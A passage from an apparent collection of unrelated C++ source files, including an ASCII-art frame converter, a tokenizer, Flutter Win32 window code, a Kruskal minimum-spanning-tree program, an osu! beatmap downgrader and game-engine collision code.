best_match_img};\n}\n\nvoid process_frame(const cv::Mat &frame, int count, const std::map<char, cv::Mat> &font_images, int font_size, const std::string &output_img_dir, const std::string &output_txt_dir)\n{\n    cv::Mat gray_frame;\n    cvtColor(frame, gray_frame, cv::COLOR_BGR2GRAY);\n\n    cv::Mat output_image = cv::Mat::zeros(gray_frame.size(), gray_frame.type());\n    std::vector<std::string> characters_grid;\n\n    for (int j = 0; j <= gray_frame.rows - font_size; j += font_size)\n    {\n        std::string row_chars;\n        for (int i = 0; i <= gray_frame.cols - font_size; i += font_size)\n        {\n            cv::Rect region(i, j, font_size, font_size);\n            cv::Mat segment = gray_frame(region);\n\n            auto [best_match_char, best_match_img] = compare_matrices(segment, font_images);\n            cv::Mat destination = output_image(cv::Rect(i, j, font_size, font_size));\n            best_match_img.copyTo(destination);\n            row_chars += best_match_char;\n        }\n        characters_grid.push_back(row_chars);\n    }\n\n    std::string frame_filename = output_img_dir + \"/frame_\" + formatNumber(count, 10) + \".png\";\n    std::string text_filename = output_txt_dir + \"/frame_\" + formatNumber(count, 10) + \".txt\";\n\n    bool isWritten = cv::imwrite(frame_filename, output_image);\n    if (!isWritten)\n    {\n        std::cerr << \"Failed to write image to \" << frame_filename << std::endl;\n    }\n\n    std::ofstream file(text_filename);\n    if (!file)\n    {\n        std::cerr << \"Failed to open text file \" << text_filename << std::endl;\n    }\n    else\n    {\n        for (const auto &row : characters_grid)\n        {\n            file << row << '\\n';\n        }\n    }\n\n    std::lock_guard<std::mutex> guard(io_mutex);\n}\n\nint main(int argc, ch",
    "#include \"aos.hpp\"\r\n\r\n// This is a demo of the \"AOS\" library, devoloped by XeTute. \r\n// XeTutes website: \"https://xetute.neocities.org/\"\r\n\r\nint main()\r\n{\r\n\tAOS<AOS<int>> myArray(6); //create two-dimensional array with the data-type of int\r\n\tmyArray.resize(3); //Resize the array. Got it working, finally =)\r\n\r\n\t{ //bracets cuz var \"aSize\" is tmp \r\n\t\tconst size_t aSize = myArray.size(); // aSize = array size\r\n\t\tfor (size_t row = 0; row < aSize; ++row) //init each element\r\n\t\t{\r\n\t\t\tmyArray[row].init(aSize, 9);\r\n\t\t\t//myArray[row].init(aSize); <-- This line would automatically set every value to \"NULL\" / 0. Nice, right? :3\r\n\r\n\t\t\tfor (size_t column = 0; column < aSize; ++column) \r\n\t\t\t{\r\n\t\t\t\tmyArray[row][column] = row * column; //assign unique value. It would not crash, because AOS auto-inits to zero if not value was provided\r\n\t\t\t\tstd::cout << myArray[row][column] << \" | \"; // std::cout << myArray.data[row].data[column] would also work, operator was overloaded\r\n\t\t\t}\r\n\t\t\tstd::cout << \"\\n-----------\\n\";\r\n\t\t}\r\n\t}\r\n\t\r\n\tmyArray.suicide(); //Let the array kill itself. This prevents memory leaks\r\n\r\n\treturn 0;\r\n}\r\n",
    "#undef NDEBUG\r\n#include <iostream>\r\n#include <cassert>\r\n#include <fstream>\r\n#include <cstdint>\r\n#include <cstdlib>\r\n#include <vector>\r\n\r\ninline static char* findFirst(char* str, char c)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (*_c == c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c == *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, const char* chars)\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tfor (const char* c = chars; *c != '\\0'; c++)\r\n\t\t\tif (*_c != *c) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirst(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\ninline static char* findFirstNot(char* str, int f(int))\r\n{\r\n\tchar* _c = str;\r\n\tfor (; *_c != '\\0'; _c++)\r\n\t\tif (!f(*_c)) return _c;\r\n\treturn _c;\r\n}\r\n\r\n#pragma pack(2)\r\nstruct String\r\n{\r\n\tchar* start;\r\n\tuint16_t length;\r\n\r\n\ttemplate <typename T>\r\n\tinline T applyAsNormalString(T f(const char*)) const\r\n\t{\r\n\t\tchar ei = start[length];\r\n\t\tstart[length] = '\\0';\r\n\t\tT v = f(start);\r\n\t\tstart[length] = ei;\r\n\t\treturn v;\r\n\t}\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tfor (uint16_t i = 0; i < length; i++)\r\n\t\t\tputchar(start[i]);\r\n\t}\r\n\r\n\tinline long long toInt() const\r\n\t{\r\n\t\treturn applyAsNormalString(atoll);\r\n\t}\r\n\r\n\tinline double toDouble() const\r\n\t{\r\n\t\treturn applyAsNormalString(atof);\r\n\t}\r\n};\r\n\r\ninline static void todo(const char* str)\r\n{\r\n\tstd::cout << \"TODO: \" << str;\r\n\tabort();\r\n}\r\n\r\nnamespace tokenKinds\r\n{\r\n\tconstexpr uint8_t\r\n\t\tnumber = 0,\r\n\t\talpha = 1,\r\n\t\tsolo = 2,\r\n\t\tstring = 3;\r\n\r\n\tconst char* names[] = {\r\n\t\t\"number\",\r\n\t\t\"alpha\",\r\n\t\t\"solo\",\r\n\t\t\"\\033[32mstring\"\r\n\t};\r\n}\r\n\r\nstruct Token\r\n{\r\n\tString str;\r\n\tuint8_t kind;\r\n\r\n\tinline void print() const\r\n\t{\r\n\t\tstd::cout << tokenKinds::names[kind] << \"\\033[0m\\t'\\033[36m\";\r\n\r\n\t\tstr.print();\r\n\r\n\t\tstd::cout << \"\\033[0m'\\n\";\r\n\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tstd::vector<Token> tokens;\r\n\r\n\tstd::ifstream file(\"test.jiw\");\r\n\tassert(file.is_open());\r\n\r\n\tfile.seekg(0, std::ios::end);\r\n\tsize_t fileSize = file.tellg();\r\n\tfile.seekg(0, std::ios::beg);\r\n\r\n\tchar* buffer = (char*)malloc(fileSize);\r\n\tassert(buffer != nullptr);\r\n\r\n\tfile.read(buffer, fileSize);\r\n\tfile.close();\r\n\r\n\tuint8_t kind;\r\n\tchar* end = nullptr;\r\n\tfor (char* c = buffer; *c != '\\0';)\r\n\t{\r\n\t\tif (isspace(*c))\r\n\t\t{\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\telse if (isdigit(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isdigit);\r\n\t\t\tkind = tokenKinds::number;\r\n\t\t}\r\n\t\telse if (isalpha(*c))\r\n\t\t{\r\n\t\t\tend = findFirstNot(c + 1, isalnum);\r\n\t\t\tkind = tokenKinds::alpha;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tif (*c == '/')\r\n\t\t\t{\r\n\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t{\r\n\t\t\t\t\tc = findFirst(c + 2, '\\n') + 1;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\telse if (c[1] == '*')\r\n\t\t\t\t{\r\n\t\t\t\t\tc++;\r\n\t\t\t\t\twhile (true)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tc = findFirst(c + 1, '*');\r\n\t\t\t\t\t\tif (c[1] == '/')\r\n\t\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tc += 2;\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\r\n\t\t\ttokens.push_back({ { c, 1 }, tokenKinds::solo });\r\n\r\n\t\t\tif (*c == '\"')\r\n\t\t\t{\r\n\t\t\t\tend = findFirst(++c, '\"');\r\n\t\t\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, tokenKinds::string });\r\n\t\t\t\ttokens.push_back({ { c = end, 1 }, tokenKinds::solo });\r\n\t\t\t}\r\n\r\n\t\t\tc++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\r\n\t\ttokens.push_back({ { c, static_cast<uint16_t>(end - c) }, kind });\r\n\t\tc = end;\r\n\t}\r\n\r\n\tfor (Token& token : tokens)\r\n\t{\r\n\t\ttoken.print();\r\n\t}\r\n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <bits/stdc++.h>\n\nclass Edge {\npublic:\n  int source;\n  int dest;\n  int weight;\n};\n\nbool compare(Edge e1, Edge e2) { return e1.weight < e2.weight; }\n\nint findParent(int v, int *parent) {\n  if (parent[v] == v) {\n    return v;\n  }\n  return findParent(parent[v], parent);\n}\n\nvoid Kruskal(Edge *input, int n, int E) {\n  // Sort the input array - accending order based on weights\n  std::sort(input, input + E, compare);\n\n  Edge *output = new Edge[n - 1];\n  int *parent = new int[n];\n\n  for (int i = 0; i < n; i++) {\n    parent[i] = i;\n  }\n\n  int count = 0;\n  int i = 0;\n  while (count != n - 1) {\n    Edge currentEdge = input[i];\n\n    // Check if we can add the currentEdge in MST or not\n    int sourceParent = findParent(currentEdge.source, parent);\n    int destParent = findParent(currentEdge.dest, parent);\n\n    if (sourceParent != destParent) {\n      output[count] = currentEdge;\n      count++;\n      parent[sourceParent] = destParent;\n    }\n    i++;\n  }\n\n  int minWeight = 0;\n\n  std::cout << std::endl;\n  std::cout << \"The MST will be: \" << std::endl;\n\n  for (int i = 0; i < n - 1; i++) {\n    std::cout << std::endl;\n    if (output[i].source < output[i].dest) {\n      std::cout << output[i].source << \" \" << output[i].dest << \" \"\n                << output[i].weight << std::endl;\n\n      minWeight += output[i].weight;\n    } else {\n      std::cout << output[i].dest << \" \" << output[i].source << \" \"\n                << output[i].weight << std::endl;\n\n      minWeight += output[i].weight;\n    }\n  }\n\n  std::cout << std::endl;\n  std::cout << \"The Total value will be: \" << minWeight << std::endl;\n}\n\nint main() {\n  int n, E;\n  std::cout << \"Enter the number of vertices: \";\n  std::cin >> n;\n  std::cout << \"Enter the number of Edges: \";\n  std::cin >> E;\n\n  Edge *input = new Edge[E];\n\n  std::cout << \"Enter source , destination and Weight in that order: \"\n            << std::endl;\n\n  for (int i = 0; i < E; i++) {\n    int s, d, w;\n    std::cin >> s >> d >> w;\n    input[i].source = s;\n    input[i].dest = d;\n    input[i].weight = w;\n  }\n\n  Kruskal(input, n, E);\n}\n",
    "#include <iostream>\r\n#include <filesystem>\r\n#include <vector>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <string.h>\r\n#include <string_view>\r\n#include <algorithm>\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD);\r\n\r\nstd::string removeCarriageReturn(std::string str)\r\n{\r\n  str.erase(std::remove(str.begin(), str.end(), '\\r'), str.end());\r\n  return str;\r\n}\r\nbool is_number(const std::string &s)\r\n{\r\n  std::string::const_iterator it = s.begin();\r\n  while (it != s.end() && std::isdigit(*it))\r\n    ++it;\r\n  return !s.empty() && it == s.end();\r\n}\r\nstd::string replaceString(std::string subject, const std::string &search, const std::string &replace)\r\n{\r\n  size_t pos = subject.find(search);\r\n  while (pos != std::string::npos)\r\n  {\r\n    subject.replace(pos, search.length(), replace);\r\n    pos = subject.find(search, pos + replace.length());\r\n  }\r\n  return subject;\r\n}\r\nbool string_contains(std::string input, std::string key)\r\n{\r\n  if (input.find(key) != std::string::npos)\r\n  {\r\n    return true;\r\n  }\r\n  return false;\r\n}\r\nstd::vector<std::string> split(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  while ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    pos_start = pos_end + delim_len;\r\n    res.push_back(token);\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\nstd::vector<std::string> split_first(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  if ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    res.push_back(token);\r\n    pos_start = pos_end + delim_len;\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\n\r\nint main()\r\n{\r\n  int option_range = 0;\r\n  std::cout << \"##################\\nosuTo2007 v1.6\\nosu! : _Railgun_\\nDiscord : @railgun_osu\\n##################\\n\\n\";\r\n  std::vector<std::filesystem::path> map_list;\r\n  for (const auto &entry : std::filesystem::directory_iterator(std::filesystem::current_path()))\r\n  {\r\n    if (entry.path().extension() == \".osu\")\r\n    {\r\n      map_list.push_back(entry.path());\r\n    }\r\n  }\r\n  if (map_list.size() == 0)\r\n  {\r\n    std::cout << \"No .osu files found\\nExiting...\";\r\n    return 0;\r\n  }\r\n  else\r\n  {\r\n    std::cout << \"Choose which .osu file you want to convert to v3:\\n\\n\";\r\n    if (map_list.size() > 1)\r\n    {\r\n      std::cout << \"0 = All listed below\\n\";\r\n    }\r\n    for (size_t i = 1; i - 1 < map_list.size(); i++)\r\n    {\r\n      std::cout << i << \" = \" << map_list[i - 1].filename() << \"\\n\";\r\n      option_range++;\r\n    }\r\n  }\r\nopt:\r\n  std::cout << \"Choose an option:\\n\";\r\n  std::string input;\r\n  std::cin >> input;\r\n  if (!is_number(input))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt;\r\n  }\r\n  if (!(std::stoi(input) < option_range + 1))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt;\r\n  }\r\n  bool keep_OD;\r\nopt2:\r\n  std::cout << \"Because in v3 AR(ApproachRate) is tied to OD(OverallDifficulty):\\nOD = AR\\nDo you prefer to have:\\n1 = same OverallDifficulty (map might be hard to read)\\n2 = same ApproachRate (map might be hard to acc)\\n\";\r\n  std::string input2;\r\n  std::cin >> input2;\r\n  if (!is_number(input2))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt2;\r\n  }\r\n  if ((std::stoi(input2) < 1) || (std::stoi(input2) > 2))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt2;\r\n  }\r\n  if (input2 == \"1\")\r\n  {\r\n    keep_OD = true;\r\n  }\r\n  else\r\n  {\r\n    keep_OD = false;\r\n  }\r\n  if (std::stoi(input) == 0)\r\n  {\r\n    for (int i = 0; i < map_list.size(); i++)\r\n    {\r\n      downgradeOsuFile(map_list[i], keep_OD);\r\n    }\r\n  }\r\n  else\r\n  {\r\n    downgradeOsuFile(map_list[std::stoi(input) - 1], keep_OD);\r\n  }\r\n  return 0;\r\n}\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD)\r\n{\r\n  // predefined keys to search for\r\n  static std::vector<std::string> general_Var = {\"AudioFilename\", \"PreviewTime\", \"SampleSet\"};\r\n  static std::vector<std::string> metaData_Var = {\"Title\", \"Artis\", \"Creator\", \"Version\"};\r\n  static std::vector<std::string> difficulty_Var = {\"HPDrainRate\", \"CircleSize\", \"OverallDifficulty\", \"ApproachRate\", \"SliderMultiplier\", \"SliderTickRate\"};\r\n\r\n  // current filename\r\n  std::string fileName = \"(converted) \" + filePath.filename().string();\r\n\r\n  // osu file format version\r\n  std::string fileFormat = \"\";\r\n  std::string OD_line = \"\";\r\n  std::string AR_line = \"\";\r\n  std::vector<std::pair<std::string, std::string>> general, metadata, difficulty;\r\n  std::vector<std::string> events, timingPoints, hitObjects;\r\n  bool skip = false;\r\n  int section = 0;\r\n  std::cout << \"Downgrading \" << filePath.filename() << \" to v3 file format...\\n\";\r\n  std::ifstream file(filePath);\r\n  if (file.is_open())\r\n  {\r\n    std::string line;\r\n\r\n  ",
    "#include \"DataStruct.h\"\n\nbool Robot::get() {\n    string order = \"get \" + to_string(id);\n    orders.push_back(order);\n    return true;\n}\n\nbool Robot::pull() {\n    string order = \"pull \" + to_string(id);\n    orders.push_back(order);\n    return true;\n}\n\nbool Robot::move(int moveDirection) {\n    string order = \"move \" + to_string(id) + \" \" + to_string(int(moveDirection));\n    orders.push_back(order);\n    return true;\n}\n\nbool Robot::reset() {\n    path.clear();\n    target.clear();\n    goodID = -1;\n    return true;\n}\n\nvoid Robot::updatePrevData() {\n    prevX = x;\n    prevY = y;\n    prevGoodStatus = goodStatus;\n    prevMoveStatus = moveStatus;\n    prevGoodID = goodID;\n}\n\nbool Good::isValid(int frame) {\n    return frame < appearFrame + frameOfGoodExist;\n}\n\nbool Boat::ship(int berthID, int frameID) {\n    //TODO \u68c0\u6d4b\n    orderFrame = frameID;\n    order = \"ship \" + to_string(id) + \" \" + to_string(berthID);\n    return true;\n}\n\nbool Boat::go(int frameID) {\n    //TODO \u68c0\u6d4b\n    orderFrame = frameID;\n    order = \"go \" + to_string(id);\n    return true;\n}\n\nvoid Boat::reset() {\n    size = 0;\n    worth = 0;\n}\n\nbool targetCompare(const Target t1, const Target t2){\n    return (double)t1.worth / (t1.takeCost + t1.sendCost) > (double)t2.worth/(t2.takeCost+t2.sendCost);\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "// N3TransformCollision.cpp: implementation of the CN3TransformCollision class.\n//\n//////////////////////////////////////////////////////////////////////\n#include \"stdafx.h\"\n#include \"N3TransformCollision.h\"\n#include \"N3VMesh.h\"\n\nCN3TransformCollision::CN3TransformCollision()\n{\n\tm_dwType |= OBJ_TRANSFORM_COLLISION;\n\n\tm_fRadius = 0;\n\tm_vMin.Set(0,0,0);\n\tm_vMax.Set(0,0,0);\n\n\tm_pMeshCollision = NULL;\n\tm_pMeshClimb = NULL;\n}\n\nCN3TransformCollision::~CN3TransformCollision()\n{\n\ts_MngVMesh.Delete(&m_pMeshCollision);\n\ts_MngVMesh.Delete(&m_pMeshClimb);\n}\n\nvoid CN3TransformCollision::Release()\n{\n\tm_fRadius = 0;\n\tm_vMin.Set(0,0,0);\n\tm_vMax.Set(0,0,0);\n\n\ts_MngVMesh.Delete(&m_pMeshCollision);\n\ts_MngVMesh.Delete(&m_pMeshClimb);\n\n\tCN3Transform::Release();\n}\n\nbool CN3TransformCollision::Load(HANDLE hFile)\n{\n\tCN3Transform::Load(hFile);\n\n\tint nL = 0;\n\tchar szFN[512] = \"\";\n\n\tDWORD dwRWC;\n\tReadFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\tif(nL > 0)\n\t{\n\t\tReadFile(hFile, szFN, nL, &dwRWC, NULL); szFN[nL] = NULL; // \uba54\uc2dc \ud30c\uc77c \uc774\ub984..\n\t\tm_pMeshCollision = s_MngVMesh.Get(szFN);\n\t}\n\n\tReadFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\tif(nL > 0)\n\t{\n\t\tReadFile(hFile, szFN, nL, &dwRWC, NULL); szFN[nL] = NULL; // \uba54\uc2dc \ud30c\uc77c \uc774\ub984..\n\t\tm_pMeshClimb = s_MngVMesh.Get(szFN);\n\t}\n\treturn true;\n}\n\n#ifdef _N3TOOL\nbool CN3TransformCollision::Save(HANDLE hFile)\n{\n\tCN3Transform::Save(hFile);\n\n\tDWORD dwRWC;\n\n\tint nL = 0;\n\tif(m_pMeshCollision) nL = m_pMeshCollision->FileName().size();\n\tWriteFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\tif(nL > 0) \n\t{\n\t\tif(m_pMeshCollision->FileName().find(\"object\\\\\") < 0) // \uc784\uc2dc\ub85c \uacbd\ub85c\ub97c \ubc14\uafb8\ub824\uace0 \ub123\uc5c8\ub2e4.. \ub098\uc911\uc5d0 \ud544\uc694\uc5c6\uc74c \uc9c0\uc6b4\ub2e4..\n\t\t{\n\t\t\tchar szFNTmp[256];\n\t\t\twsprintf(szFNTmp, \"Object\\\\%s.N3VMesh\", m_pMeshCollision->m_szName.c_str());\n\t\t\tm_pMeshCollision->FileNameSet(szFNTmp);\n\n\t\t\tSetFilePointer(hFile, -4, 0, FILE_CURRENT);\n\t\t\tnL = m_pMeshCollision->FileName().size();\n\t\t\tWriteFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\t\t}\n\n\t\tWriteFile(hFile, m_pMeshCollision->FileName().c_str(), nL, &dwRWC, NULL);\n\t}\n\n\tnL = 0;\n\tif(m_pMeshClimb) nL = m_pMeshClimb->FileName().size();\n\tWriteFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\tif(nL > 0) \n\t{\n\t\tif(-1 == m_pMeshClimb->FileName().find(\"object\\\\\")) // \uc784\uc2dc\ub85c \uacbd\ub85c\ub97c \ubc14\uafb8\ub824\uace0 \ub123\uc5c8\ub2e4.. \ub098\uc911\uc5d0 \ud544\uc694\uc5c6\uc74c \uc9c0\uc6b4\ub2e4..\n\t\t{\n\t\t\tchar szFNTmp[256];\n\t\t\twsprintf(szFNTmp, \"Object\\\\%s.N3VMesh\", m_pMeshClimb->m_szName.c_str());\n\t\t\tm_pMeshClimb->FileNameSet(szFNTmp);\n\n\t\t\tSetFilePointer(hFile, -4, 0, FILE_CURRENT);\n\t\t\tnL = m_pMeshClimb->FileName().size();\n\t\t\tWriteFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\t\t}\n\n\t\tWriteFile(hFile, m_pMeshClimb->FileName().c_str(), nL, &dwRWC, NULL);\n\t}\n\treturn true;\n}\n#endif // end of _N3TOOL\n\nvoid CN3TransformCollision::CollisionMeshSet(const std::string& szFN)\n{\n\ts_MngVMesh.Delete(&m_pMeshCollision);\n\tm_pMeshCollision = s_MngVMesh.Get(szFN);\n\tif(m_pMeshCollision) this->FindMinMax();\n}\n\nvoid CN3TransformCollision::ClimbMeshSet(const std::string& szFN)\n{\n\ts_MngVMesh.Delete(&m_pMeshClimb);\n\tm_pMeshClimb = s_MngVMesh.Get(szFN);\n\tif(m_pMeshClimb) m_pMeshClimb->FindMinMax();\n}\n\nint CN3TransformCollision::CheckCollisionPrecisely(bool bIgnoreBoxCheck, int ixScreen, int iyScreen, __Vector3* pVCol, __Vector3* pVNormal)\n{\n\t__Vector3 vPos, vDir; // 2D \uc88c\ud45c\ub97c 3D \uc88c\ud45c\ub85c \ubc14\uafb8\uace0..\n\t::_Convert2D_To_3DCoordinate(ixScreen, iyScreen, s_CameraData.mtxView, s_CameraData.mtxProjection, s_CameraData.vp, vPos, vDir);\n\n\tif(false == m_pMeshCollision->Pick(m_Matrix, vPos, vDir, pVCol, pVNormal)) return -1;\n\telse return 0;\n}\n\nvoid CN3TransformCollision::RenderCollisionMesh()\n{\n\tif(NULL == m_pMeshCollision) return;\n\ts_lpD3DDev->SetTransform(D3DTS_WORLD, &m_Matrix);\n\n\tm_pMeshCollision->Render(0xffff0000); // \ube68\uac04\uc0c9.\n}\n\nvoid CN3TransformCollision::RenderClimbMesh()\n{\n\tif(NULL == m_pMeshClimb) return;\n\ts_lpD3DDev->SetTransform(D3DTS_WORLD, 